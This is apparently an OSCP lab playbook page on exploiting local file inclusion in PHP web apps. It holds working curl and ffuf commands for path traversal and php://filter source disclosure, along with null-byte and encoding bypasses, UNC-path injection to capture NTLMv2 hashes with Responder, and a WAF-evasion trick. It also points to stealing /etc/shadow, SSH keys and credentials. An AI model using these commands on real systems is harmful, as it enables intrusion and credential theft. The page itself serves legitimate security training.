# Linux - LFI

**Step 7 of 50 · Linux**

*Confirm local file inclusion, read sensitive files, and escalate to code execution if PHP wrappers are available.*

## Run this

Find the parameter — look for `?file=`, `?page=`, `?path=`, `?template=`, `?img=` in the URL or form source. Then test:

> **Why:** This content scan tests likely paths or hostnames to find hidden pages, files, or virtual hosts that are not linked from the homepage.
```bash
# Basic path traversal — confirms LFI if /etc/passwd returns
curl -s "http://$BoxIP/index.php?file=../../../../etc/passwd"

# PHP filter — read PHP source without executing it
curl -s "http://$BoxIP/index.php?file=php://filter/convert.base64-encode/resource=index.php" | base64 -d

# Parameter fuzzing — find the vulnerable parameter if it is not obvious
ffuf -u "http://$BoxIP/image.php?FUZZ=../../../../etc/passwd" \
  -w /usr/share/wordlists/dirb/common.txt \
  -fs 0
```

## Example output

Path traversal confirmed:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

PHP filter output (pipe to `base64 -d`):

```
<?php
$db_password = "REDACTED";
...
```

## What did you get?

- [ ] `/etc/passwd` is returned → **Run the same request with `/etc/shadow`, `/home/$Username/.ssh/id_rsa`, and the application's configuration filename, saving each response to `$BoxDir/loot/`**
- [ ] PHP source is returned via `php://filter` → **Run `curl -s 'http://$BoxIP/$Path?file=php://filter/convert.base64-encode/resource=$Config' | base64 -d` for each included config file and save the decoded source**
- [ ] Credentials or keys are found → **Save them to `$BoxDir/loot/credentials.txt`, then go to Step 17 · [[Linux - Credential Search]] or Step 3B · [[Linux - SSH Brute Force]] for a controlled SSH test**
- [ ] LFI works but no useful files are found → **Go to Step 7A · [[Linux - RFI]] and run its PHP-wrapper tests, then return here for the log-poisoning branch if the wrapper is blocked**
- [ ] A shell is caught from `data://` or log poisoning → **Go to Step 12 · [[Linux - Shell Stabilise]]**
- [ ] The parameter does not accept traversal → **Resend the request with a `%00` suffix only when the PHP version is below 5.3.4, then retry the path with `%252e%252e%252f` double URL-encoding**
- [ ] The host is Windows and UNC paths are accepted → **Set up Responder (`responder -I tun0`) and inject `\\$LocalIP\share` as the file path. Crack a captured NTLMv2 response offline with hashcat mode 5600**
- [ ] UNC path is blocked ("Suspicious Activity Blocked" or similar WAF response) → **Try forward slashes instead of backslashes: `http://$BoxIP/index.php?view=//$LocalIP/share/probe` -- many WAFs only filter backslash-UNC patterns, not forward-slash equivalents**

## Notes

Read every PHP file you can reach — `config.php`, `db.php`, `functions.php`. Config files often contain database credentials that lead to a shell via [[Linux - Database Access]].

For RCE via `data://` or log poisoning, build the payload from HackTricks — the exact wrapper and encoding vary by PHP version and server configuration.

## Gotcha

> [!warning] 💡
> `php://filter` and `data://` wrappers only work when the target runs PHP and the include function is not filtering protocol wrappers. If the wrapper is silently ignored, the parameter is being sanitised.

> [!warning] 💡
> Null-byte truncation (`%00`) only works on PHP versions below 5.3.4. On modern PHP, use other bypass techniques listed on PayloadsAllTheThings.

> [!warning] 💡
> A Windows UNC path can trigger an outbound SMB authentication attempt. The target does not need to read a real file, but Responder must already be listening before the request is made.

> [!warning] 💡
> Some WAFs block backslash-style UNC paths (`\\IP\share`) but not forward-slash equivalents (`//IP/share`). If the app returns "Suspicious Activity Blocked" on a backslash UNC, switch to forward slashes before trying other bypasses.

## Forward-slash UNC bypass

When a Windows application’s file parameter rejects `\\server\share`, try equivalent slash forms. A UNC path points to a Windows network share; some filters block backslashes literally instead of understanding the underlying path.

> **Why:** These requests compare backslash and forward-slash UNC forms against the same file parameter; look for an outbound authentication attempt in Responder or a changed response.
```bash
# Start Responder on tun0 in a separate terminal before sending these probes.
curl -s "http://$BoxIP/index.php?view=\\\\$LocalIP\\share\\probe"
curl -s "http://$BoxIP/index.php?view=//$LocalIP/share/probe"
curl -s "http://$BoxIP/index.php?view=\\/$LocalIP/share/probe"
```

## Additional routing

- [ ] A UNC request triggers an inbound NTLM challenge → **Capture only the authorized hash material, crack it offline, and validate the account**
- [ ] Backslashes are blocked but forward slashes change the response → **Continue with the forward-slash form and document the filter bypass**
- [ ] All forms are blocked → **Return to ordinary LFI paths or Step 10 · [[Windows - Exploit Search]]**

## External Resources

| Resource | Link |
|---|---|
| HackTricks — LFI | https://book.hacktricks.xyz/pentesting-web/file-inclusion |
| PayloadsAllTheThings — LFI | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion |
## Seen in
- [[OSCP/BOXES/WRITE UPS/Linux/Payday|Payday]] -- confirmed in the box write-up
- [[OSCP/BOXES/WRITE UPS/Linux/Snookums|Snookums]] -- confirmed in the box write-up
- [[OSCP/BOXES/WRITE UPS/AD/Flight|Flight]] -- confirmed in the box write-up

## Related stages

- [[Linux - Service Scan]]
- [[Linux - Web Enum]]
- [[Linux - Exploit Search]]
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
